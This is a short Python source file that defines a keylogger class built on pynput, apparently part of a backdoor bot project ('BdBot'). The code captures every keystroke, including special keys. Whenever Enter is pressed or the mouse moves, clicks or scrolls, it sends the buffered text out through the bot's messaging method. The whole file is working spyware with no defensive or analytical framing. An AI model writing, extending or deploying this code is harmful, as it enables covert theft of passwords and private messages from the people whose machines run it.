import pynput

class KeyLogger:
    def __init__(self, bot):
        """

        :type bot: BdBot.BdBot
        """
        self.bot=bot
        self.line = ""

        def on_press(key):
            try:
                self.line = self.line + str(key.char)
            except AttributeError:
                if str(key) == "Key.enter":
                    self.sendline()
                elif str(key) == "Key.space":
                    self.line = self.line + " "
                else:
                    short_key=str(key).replace("Key.", "")
                    self.line = self.line + "<" + short_key + ">"

        def on_mouse(x, y, a=None, b=None):
            self.sendline()

        keyboard_listener=pynput.keyboard.Listener(on_press=on_press)
        keyboard_listener.start()

        mouse_listener = pynput.mouse.Listener(
            on_move=on_mouse,
            on_click=on_mouse,
            on_scroll=on_mouse)
        mouse_listener.start()

    def sendline(self):
        if self.line != "":
            self.bot.send_message_joined_sync(self.line)
            self.line=""



